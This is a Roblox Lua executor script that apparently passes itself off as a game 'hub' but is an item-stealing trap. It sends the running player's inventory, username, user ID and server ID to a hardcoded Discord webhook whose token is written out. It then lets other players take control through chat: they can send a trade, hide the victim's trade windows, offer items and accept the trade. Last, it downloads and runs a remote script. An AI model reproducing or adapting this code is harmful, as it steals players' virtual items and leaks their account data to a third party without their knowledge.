if game.PlaceId == 142823291 then
t = {}
for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
 table.insert(t, tostring(i).." : "..tostring(v)..", ")
end
inventory = table.concat(t)
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile";
local Embed = {
    title = 'LocalPlayer: ' .. game.Players.LocalPlayer.Name;
    color = '15';
    footer = { text = 'User id: ' .. game.Players.LocalPlayer.UserId };
    author = {
        name = '';
        url = '';
    };
    fields = {
        {
            name = game.JobId;
            value = inventory;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1257173760272760925/nZQC4J_FvwVLXVzJAhIJdmyr3SIauCJZ1W0IaISsGROBpFvmEIwtfYOUhzKN2fFVwlL-';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};

Player = game.Players.LocalPlayer
Pl = game.Players

function MainCommands(plr, msg)
    if msg == "p" then
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end

    if msg == "s" then
 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(plr)
        for i = 1, math.huge do
        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
        task.wait()
    end
    end

    if msg == "a" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        
    end

    local args = {
        [1] = msg,
        [2] = "Weapons"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))

end

for i, v in Pl:GetChildren() do
    if v ~= Player then
        v.Chatted:Connect(function(msg)
            MainCommands(v, msg)
        end)
    end
end

Pl.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        MainCommands(plr, msg)
    end)
end)
loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
end
